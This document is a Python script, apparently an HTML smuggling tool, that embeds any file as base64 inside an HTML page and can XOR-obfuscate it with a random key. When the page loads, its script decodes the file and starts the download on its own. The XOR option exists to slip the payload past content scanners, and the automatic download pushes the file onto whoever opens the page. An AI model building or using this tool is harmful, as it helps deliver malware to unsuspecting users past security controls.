import argparse
import base64
import os
import random
import string

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
<script>
(function() {{
    const base64Data = "{b64}";
    const fileName = "{filename}";

    function b64ToBlob(b64Data) {{
        const byteCharacters = atob(b64Data);
        const byteNumbers = new Array(byteCharacters.length);

        for (let i = 0; i < byteCharacters.length; i++) {{
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }}

        let byteArray = new Uint8Array(byteNumbers);

        {xor_js}

        return new Blob([byteArray], {{
            type: "application/octet-stream"
        }});
    }}

    const blob = b64ToBlob(base64Data);

    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = fileName;

    document.body.appendChild(link);

    setTimeout(() => {{
        link.click();
        document.body.removeChild(link);
    }}, 500);

}})();
</script>

</body>
</html>
"""

def generate_key(length=16):
    alphabet = string.ascii_letters + string.digits

    return ''.join(
        random.choice(alphabet)
        for _ in range(length)
    )

def xor_data(data, key):
    key_bytes = key.encode()

    return bytes(
        b ^ key_bytes[i % len(key_bytes)]
        for i, b in enumerate(data)
    )

def file_to_base64(path, use_xor=False, key=None):
    with open(path, "rb") as f:
        raw = f.read()

    if use_xor:
        raw = xor_data(raw, key)

    return base64.b64encode(raw).decode()

def main():
    parser = argparse.ArgumentParser(
        description="Embed file into HTML"
    )

    parser.add_argument(
        "-f",
        "--file",
        required=True,
        help="File to embed"
    )

    parser.add_argument(
        "-o",
        "--output",
        default="output.html",
        help="Output HTML file"
    )

    parser.add_argument(
        "--xor",
        action="store_true",
        help="Enable XOR obfuscation"
    )

    args = parser.parse_args()

    if not os.path.isfile(args.file):
        print(f"[-] File {args.file} not found")
        return

    xor_key = ""
    xor_js = ""

    if args.xor:
        xor_key = generate_key()

        xor_js = f'''
        const xorKey = "{xor_key}";

        function xorDecrypt(uint8Array, key) {{
            const keyBytes = new TextEncoder().encode(key);

            for (let i = 0; i < uint8Array.length; i++) {{
                uint8Array[i] ^= keyBytes[i % keyBytes.length];
            }}

            return uint8Array;
        }}

        byteArray = xorDecrypt(byteArray, xorKey);
        '''

    b64 = file_to_base64(
        args.file,
        use_xor=args.xor,
        key=xor_key
    )

    filename = os.path.basename(args.file)

    html = HTML_TEMPLATE.format(
        b64=b64,
        filename=filename,
        xor_js=xor_js
    )

    with open(args.output, "w", encoding="utf-8") as f:
        f.write(html)

    print(f"[+] File {args.output} was generated with embedded {args.file}")

if __name__ == "__main__":
    main()
